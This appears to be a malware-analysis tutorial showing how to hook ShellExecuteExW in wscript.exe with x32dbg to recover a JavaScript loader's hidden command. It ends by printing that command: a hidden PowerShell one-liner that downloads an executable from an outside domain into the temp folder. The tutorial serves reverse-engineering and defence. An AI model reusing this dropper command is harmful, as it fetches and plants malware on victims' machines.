***Overview*** 

Original idea credits go to Open Analysis Labs(OALabs). This will cover using a debugger to hook standard Windows API function calls used in JavaScript/VBScript loaders used in malware to analyze the original loader.  

***Tools***

- JavaScript Loader Sample.  `Hash: 7616fd825e223fb6f7bfdc0c025a2cf0196b8959cad69eda959c21a7d31e71d5`

- x32/64dbg

***Understanding wscript.exe***

Essentially when Windows runs a JavaScript/VBScript, which calls Windows API functions, it will use wscript.exe as a middle man between the script and the Windows API.

It looks something like the following:

`loader.js -> wscript.exe -> ShellExecuteA`

***Some common function calls used in cases like this are:***

WSASocketW  GetAddrInfoExW  WSASend 

WSAStarup    URLDownloadToFile  ShellExecuteA

ShellExecuteExW 

***Common DLLs:***

shell32.dll and ws2_32.dll

***Technical Begin***

Attach the debugger to wscript.exe located at `C:\Windows\SysWOW64\wscript.exe`

Provide the path to the script file so wscript.exe can execute it. You can do this in x32dbg by going to `File -> Change Command Line`

At this point, you should be ready to go. In the case of this loader, we need to set a breakpoint on shell32.dll. We can not set breakpoints yet on the function calls because they have not been imported yet hence why we need to break on the import of shell32.dll and then move forward on setting up hooks (Breakpoints) on the common function calls. 

Navigate to Breakpoints and in the Command section at the bottom, set a breakpoint on shell32.dll, and then you should see it enabled. 

![image](https://user-images.githubusercontent.com/95584654/158504637-ce708340-f9fd-4aa7-a937-fb755e69bf91.png)


At this point, you can start the debugger and continue until you hit the breakpoint to load the shell32.dll. Looking at the Breakpoint page, we can see that we have one hit on our breakpoint. Navigate to the Symbols page and click on shell32.dll. At this point, you can see all of the symbols. Filter for ShellExecuteExW and set a hook (Breakpoint) on it. 

![image](https://user-images.githubusercontent.com/95584654/158504684-d978c75f-423c-4929-8a4d-6a5892ae803c.png)


After setting the breakpoint, continue debugging and you should hit the breakpoint on ShellExecuteExW. We want to look at the parameters for the function that were pushed on the stack. Looking at the MSDN documentation for ShellExecuteExW. The only "parameter" is a pointer to the SHELLEXECUTEINFOW structure. 

Looking at the structure, the two main parameters we want to look at are LPCSTR lpVerb and LPCSTR lpFile. 

You can read about the structure here: https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-shellexecuteinfoa 

Since we hit our hook on the ShellExecuteExW, we can look at the stack to identify the parameters for the SHELLEXECUTEINFOW structure. 

![image](https://user-images.githubusercontent.com/95584654/158504728-ec02b60c-58f1-45de-8dcc-8f6419620306.png)


We can see the cleartext parameters used in the dropper by doing this. At this point, we can right-click on those lines and select

`Copy -> Copy Selected Lines`

It is calling PowerShell as we can see. Let's take a look at the cleaned up command below: 

```
cmd "/c start /b powershell -WindowStyle Hidden 
$http_request = New-Object -ComObject Msxml2.XMLHTTP;
$adodb = New-Object -ComObject ADODB.Stream;
$path = $env:temp + '\\1079.exe';
$http_request.open('GET', 'http://kanalmalakotv.ru/documenty/pax18.exe?rnd=12802', $false);
$http_request.send();
if($http_request.Status -eq \"200\"){$adodb.open();$adodb.type = 1;$adodb.write($http_request.responseBody);
$adodb.position = 0;
$adodb.savetofile($path);
$adodb.close();}
```
